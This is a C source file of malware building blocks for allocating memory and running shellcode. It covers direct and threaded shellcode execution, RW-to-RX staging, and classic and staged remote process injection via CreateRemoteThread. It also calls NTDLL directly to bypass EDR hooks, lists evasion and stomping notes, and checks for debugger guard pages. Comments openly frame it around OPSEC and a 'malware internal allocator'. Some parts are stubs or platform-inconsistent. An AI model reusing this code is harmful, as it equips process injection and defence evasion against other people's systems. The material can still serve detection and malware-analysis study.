/*
 * Dynamic Allocation - Memory allocation patterns from shellcode/loaders
 * VirtualAlloc, HeapAlloc, mmap, NtAllocateVirtualMemory
 */

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#else
#include <sys/mman.h>
typedef unsigned char  BYTE;
typedef unsigned int   DWORD;
typedef unsigned long long QWORD;
typedef void* PVOID;
typedef long NTSTATUS;
#endif

// ============================================================================
// MEMORY PROTECTION CONSTANTS
// ============================================================================

#define M_RW   0x04  // PAGE_READWRITE
#define M_RX   0x20  // PAGE_EXECUTE_READ
#define M_RWX  0x40  // PAGE_EXECUTE_READWRITE
#define M_CR   0x3000 // MEM_COMMIT | MEM_RESERVE
#define M_REL  0x8000 // MEM_RELEASE

// Linux
#define P_RWX  (PROT_READ | PROT_WRITE | PROT_EXEC)
#define P_RW   (PROT_READ | PROT_WRITE)
#define P_RX   (PROT_READ | PROT_EXEC)
#define M_AP   (MAP_ANONYMOUS | MAP_PRIVATE)

// ============================================================================
// WINDOWS ALLOCATION PATTERNS
// ============================================================================

#ifdef _WIN32

// Classic RWX allocation (detected by EDR)
PVOID alloc_rwx(DWORD sz)
{
    return VirtualAlloc(0, sz, M_CR, M_RWX);
}

// Two-stage: RW then RX (slightly better OPSEC)
PVOID alloc_stage2(BYTE* data, DWORD sz)
{
    DWORD old;
    PVOID p = VirtualAlloc(0, sz, M_CR, M_RW);
    if(!p) return 0;

    __movsb(p, data, sz);
    VirtualProtect(p, sz, M_RX, &old);

    return p;
}

// HeapAlloc (less suspicious for data storage)
PVOID heap_alloc(DWORD sz)
{
    return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
}

void heap_free(PVOID p)
{
    HeapFree(GetProcessHeap(), 0, p);
}

// Private heap (separate from process heap)
HANDLE create_private_heap()
{
    return HeapCreate(0, 0x10000, 0);
}

PVOID private_alloc(HANDLE heap, DWORD sz)
{
    return HeapAlloc(heap, 0, sz);
}

// LocalAlloc/GlobalAlloc (legacy, still used)
PVOID local_alloc(DWORD sz)
{
    return LocalAlloc(LPTR, sz);
}

PVOID global_alloc(DWORD sz)
{
    return GlobalAlloc(GPTR, sz);
}

#endif

// ============================================================================
// NTDLL DIRECT ALLOCATION (bypass kernel32 hooks)
// ============================================================================

#ifdef _WIN32

typedef NTSTATUS (NTAPI *t_NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *t_NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// Resolve NtAllocateVirtualMemory
t_NtAllocateVirtualMemory get_NtAlloc()
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    return (t_NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
}

// Allocate via NTDLL (bypasses kernel32 hooks)
PVOID nt_alloc(DWORD sz, DWORD prot)
{
    PVOID base = 0;
    SIZE_T size = sz;

    t_NtAllocateVirtualMemory pNtAlloc = get_NtAlloc();
    if(!pNtAlloc) return 0;

    NTSTATUS status = pNtAlloc(
        (HANDLE)-1,  // Current process
        &base,
        0,
        &size,
        M_CR,
        prot
    );

    return (status == 0) ? base : 0;
}

#endif

// ============================================================================
// LINUX ALLOCATION PATTERNS
// ============================================================================

#ifndef _WIN32

PVOID alloc_rwx(size_t sz)
{
    return mmap(0, sz, P_RWX, M_AP, -1, 0);
}

PVOID alloc_stage2(BYTE* data, size_t sz)
{
    PVOID p = mmap(0, sz, P_RW, M_AP, -1, 0);
    if(p == MAP_FAILED) return 0;

    memcpy(p, data, sz);
    mprotect(p, sz, P_RX);

    return p;
}

void mem_free(PVOID p, size_t sz)
{
    munmap(p, sz);
}

#endif

// ============================================================================
// SHELLCODE EXECUTION WRAPPERS
// ============================================================================

// Direct execution
void exec_direct(BYTE* sc, DWORD len)
{
    PVOID p = alloc_rwx(len);
    __movsb(p, sc, len);
    ((void(*)())p)();
}

// Staged execution (RW -> RX)
void exec_staged(BYTE* sc, DWORD len)
{
    PVOID p = alloc_stage2(sc, len);
    ((void(*)())p)();
}

// Thread execution
void exec_thread(BYTE* sc, DWORD len)
{
    PVOID p = alloc_rwx(len);
    __movsb(p, sc, len);

    HANDLE h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)p, 0, 0, 0);
    WaitForSingleObject(h, INFINITE);
}

// ============================================================================
// REMOTE ALLOCATION (Process Injection)
// ============================================================================

#ifdef _WIN32

PVOID remote_alloc(HANDLE hProc, DWORD sz, DWORD prot)
{
    return VirtualAllocEx(hProc, 0, sz, M_CR, prot);
}

BOOL remote_write(HANDLE hProc, PVOID dst, BYTE* src, DWORD len)
{
    SIZE_T written;
    return WriteProcessMemory(hProc, dst, src, len, &written) && written == len;
}

BOOL remote_protect(HANDLE hProc, PVOID addr, DWORD sz, DWORD prot)
{
    DWORD old;
    return VirtualProtectEx(hProc, addr, sz, prot, &old);
}

// Classic injection pattern
BOOL inject_classic(DWORD pid, BYTE* sc, DWORD len)
{
    HANDLE h = OpenProcess(0x1F0FFF, 0, pid);  // PROCESS_ALL_ACCESS
    if(!h) return 0;

    PVOID p = remote_alloc(h, len, M_RWX);
    if(!p) { CloseHandle(h); return 0; }

    if(!remote_write(h, p, sc, len)) {
        VirtualFreeEx(h, p, 0, M_REL);
        CloseHandle(h);
        return 0;
    }

    HANDLE t = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)p, 0, 0, 0);
    CloseHandle(h);

    return t != 0;
}

// Two-stage injection (RW -> RX)
BOOL inject_staged(DWORD pid, BYTE* sc, DWORD len)
{
    HANDLE h = OpenProcess(0x1F0FFF, 0, pid);
    if(!h) return 0;

    PVOID p = remote_alloc(h, len, M_RW);  // RW first
    if(!p) { CloseHandle(h); return 0; }

    if(!remote_write(h, p, sc, len)) {
        VirtualFreeEx(h, p, 0, M_REL);
        CloseHandle(h);
        return 0;
    }

    remote_protect(h, p, len, M_RX);  // Change to RX

    HANDLE t = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)p, 0, 0, 0);
    CloseHandle(h);

    return t != 0;
}

#endif

// ============================================================================
// MEMORY POOL (Malware internal allocator)
// ============================================================================

typedef struct {
    BYTE* base;
    DWORD size;
    DWORD used;
} MEM_POOL;

MEM_POOL* pool_create(DWORD sz)
{
    MEM_POOL* pool = (MEM_POOL*)HeapAlloc(GetProcessHeap(), 0, sizeof(MEM_POOL));
    pool->base = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
    pool->size = sz;
    pool->used = 0;
    return pool;
}

PVOID pool_alloc(MEM_POOL* pool, DWORD sz)
{
    // Align to 8
    sz = (sz + 7) & ~7;

    if(pool->used + sz > pool->size)
        return 0;

    PVOID p = pool->base + pool->used;
    pool->used += sz;
    return p;
}

void pool_reset(MEM_POOL* pool)
{
    __stosb(pool->base, 0, pool->used);
    pool->used = 0;
}

void pool_destroy(MEM_POOL* pool)
{
    __stosb(pool->base, 0, pool->size);  // Secure wipe
    HeapFree(GetProcessHeap(), 0, pool->base);
    HeapFree(GetProcessHeap(), 0, pool);
}

// ============================================================================
// SECTION MAPPING (PE Loader pattern)
// ============================================================================

#ifdef _WIN32

// Map section from file
PVOID map_section(HANDLE hFile, DWORD offset, DWORD size, DWORD prot)
{
    HANDLE hMap = CreateFileMappingA(hFile, 0, PAGE_READONLY, 0, 0, 0);
    if(!hMap) return 0;

    PVOID p = MapViewOfFile(hMap, FILE_MAP_READ, 0, offset, size);
    CloseHandle(hMap);

    return p;
}

// Create anonymous section
PVOID create_section(DWORD size, DWORD prot)
{
    HANDLE hSection;
    LARGE_INTEGER sz;
    sz.QuadPart = size;

    // NtCreateSection for anonymous mapping
    // ...

    return 0;
}

#endif

// ============================================================================
// ALLOCATION EVASION PATTERNS
// ============================================================================

// Allocate without VirtualAlloc (use NtAllocateVirtualMemory)
// Allocate with PAGE_NOACCESS then change protection
// Use file mapping instead of direct allocation
// Allocate in suspended process, inject, resume

// Stomping: allocate over existing RX section
// 1. Find suitable RX section with slack space
// 2. VirtualProtect to RWX
// 3. Write shellcode
// 4. Execute

// ============================================================================
// MEMORY SCANNING (Anti-analysis)
// ============================================================================

// Check for memory breakpoints
BOOL check_mem_bp(PVOID addr, DWORD sz)
{
    MEMORY_BASIC_INFORMATION mbi;
    if(!VirtualQuery(addr, &mbi, sizeof(mbi)))
        return 0;

    // Guard pages indicate potential breakpoint
    return (mbi.Protect & PAGE_GUARD) != 0;
}

// Get memory info
void get_mem_info(PVOID addr, DWORD* prot, DWORD* state)
{
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(addr, &mbi, sizeof(mbi));
    *prot = mbi.Protect;
    *state = mbi.State;
}

// ============================================================================
// EOF
// ============================================================================
